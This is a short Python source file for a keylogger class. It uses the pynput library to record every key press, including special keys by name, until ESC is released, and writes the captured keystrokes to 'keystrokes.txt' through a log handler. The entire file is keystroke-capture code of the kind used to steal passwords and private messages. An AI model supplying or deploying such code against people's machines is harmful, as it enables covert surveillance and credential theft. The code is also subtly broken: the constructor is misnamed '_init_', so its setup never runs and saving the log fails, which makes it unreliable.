from pynput import keyboard
from log_handler import LogHandler

class KeyLogger:
    def _init_(self):
        self.log = []
        self.listener = None
        self.log_handler = LogHandler("keystrokes.txt")

    def _on_press(self, key):
        try:
            self.log.append(key.char)
        except AttributeError:
            self.log.append(f"[{key.name}]")

    def _on_release(self, key):
        if key == keyboard.Key.esc:
            return False  # Stop listener on ESC

    def start_logging(self):
        self.log = []
        with keyboard.Listener(on_press=self._on_press, on_release=self._on_release) as self.listener:
            self.listener.join()
        self.save_log()

    def save_log(self):
        self.log_handler.save(self.log)